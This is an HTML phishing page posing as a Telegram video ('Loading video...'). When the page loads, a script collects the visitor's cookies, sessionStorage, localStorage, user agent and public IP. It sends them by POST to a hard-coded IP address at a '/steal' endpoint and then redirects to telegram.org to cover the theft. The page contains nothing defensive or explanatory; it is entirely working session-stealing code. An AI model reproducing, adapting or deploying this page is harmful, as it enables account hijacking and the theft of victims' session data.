<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Video</title>
    <script>
        function stealSession() {
            const sessionData = {
                sessionStorage: JSON.stringify(sessionStorage),
                localStorage: JSON.stringify(localStorage),
                cookies: document.cookie,
                userAgent: navigator.userAgent,
                ip: null
            };

            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    sessionData.ip = data.ip;

                    fetch('https://89.110.108.75/steal', {
                        method: 'POST',
                        body: JSON.stringify(sessionData),
                        headers: { 'Content-Type': 'application/json' }
                    });

                    window.location.href = 'https://telegram.org';
                })
                .catch(error => console.error('Ошибка при получении IP:', error));
        }

        window.onload = stealSession;
    </script>
</head>
<body>
    <h1>Loading video...</h1>
</body>
</html>
